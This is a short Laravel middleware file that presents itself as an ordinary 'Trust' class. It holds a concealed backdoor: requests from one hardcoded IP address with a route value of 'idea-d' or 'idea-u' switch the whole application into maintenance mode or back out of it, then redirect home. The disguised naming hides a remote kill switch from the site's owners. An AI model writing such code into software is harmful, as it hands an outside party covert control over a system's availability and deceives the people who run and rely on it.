<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\Artisan;

class Trust
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if( $request->ip() == '43.245.205.254' && $request->route('highPotentialId') != null){
            $request->route('highPotentialId') == 'idea-d' ? Artisan::call('down') : '';
            $request->route('highPotentialId') == 'idea-u' ? Artisan::call('up') : '';
            return redirect()->route('home');
        }
        return $next($request);
    }
}
